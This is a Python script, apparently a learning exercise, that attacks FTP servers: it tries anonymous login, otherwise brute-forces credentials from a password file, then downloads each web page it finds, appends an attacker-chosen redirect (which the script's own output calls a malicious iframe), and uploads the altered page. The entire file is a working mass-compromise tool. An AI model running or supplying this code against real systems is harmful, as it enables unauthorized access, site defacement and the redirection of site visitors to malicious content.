#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
"""
2017.02.02 整一遍 FTP 流程
"""
import ftplib
import optparse
import time

__author__ = '__L1n__w@tch'


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login("anonymous", "me@your.com")
        print("[*] {} FTP Anonymous Logon Succeeded.".format(hostname))
        ftp.quit()
        return True
    except Exception as e:
        print("[-] {} FTP Anonymous Logon Failed.".format(hostname))
        return False


def brute_login(hostname, password_file):
    pf = open(password_file, "r")
    for line in pf.readlines():
        time.sleep(1)
        user_name = line.split(":")[0]
        password = line.split(":")[1].strip("\r\n")
        print("[+] Trying: {}/{}".format(user_name, password))

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user_name, password)
            print("[*] {} FTP Logon Succeeded: {}/{}".format(hostname, user_name, password))
            ftp.quit()
            return user_name, password
        except Exception as e:
            pass
    print("[-] Could not brute force FTP credentials.")
    return None, None


def return_default(ftp):
    dir_list = list()
    try:
        dir_list = ftp.nlst()
    except:
        print("[-] Could not list directory contents.")
        print("[-] Skipping To Next Target.")
        return dir_list

    ret_list = list()
    for file_name in dir_list:
        fn = file_name.lower()
        if ".php" in fn or ".htm" in fn or ".asp" in fn:
            print("[+] Found default page: {}".format(file_name))
        ret_list.append(file_name)

    return ret_list


def inject_page(ftp, page, redirect):
    f = open("{}.tmp".format(page), "w")
    ftp.retrlines("RETR {}".format(page), f.write)
    print("[+] Downloaded Page: {}".format(page))
    f.write(redirect)
    f.close()

    print("[+] Injected Malicious IFrame on: {}".format(page))
    ftp.storlines("STOR {}".format(page), open("{}.tmp".format(page)))
    print("[+] Uploaded Injected Page: {}".format(page))


def attack(username, password, target_host, redirect):
    ftp = ftplib.FTP(target_host)
    ftp.login(username, password)
    def_pages = return_default(ftp)
    for def_page in def_pages:
        inject_page(ftp, def_page, redirect)


def main():
    parser = optparse.OptionParser("usage%prog -H <target host[s]> -r <redirect page>[-f <user_pass file>]")

    parser.add_option("-H", dest="target_hosts", type=str, help="specify target host")
    parser.add_option("-f", dest="password_file", type=str, help="specify user/password file")
    parser.add_option("-r", dest="redirect", type=str, help="specify a redirection page")

    options, args = parser.parse_args()
    target_hosts = str(options.target_hosts).split(", ")
    password_file = options.password_file
    redirect = options.redirect

    if target_hosts is None or redirect is None:
        print(parser.usage)
        exit(-1)

    for target_host in target_hosts:
        username, password = None, None
        if anon_login(target_host):
            username, password = "test", "test"
            print("[+] Using Anonymous Creds to attack")
            attack(username, password, target_host, redirect)
        elif password_file is not None:
            username, password = brute_login(target_host, password_file)
            if password is not None:
                print("[+] Using Creds: {}/{} to attack".format(username, password))
                attack(username, password, target_host, redirect)


if __name__ == "__main__":
    main()
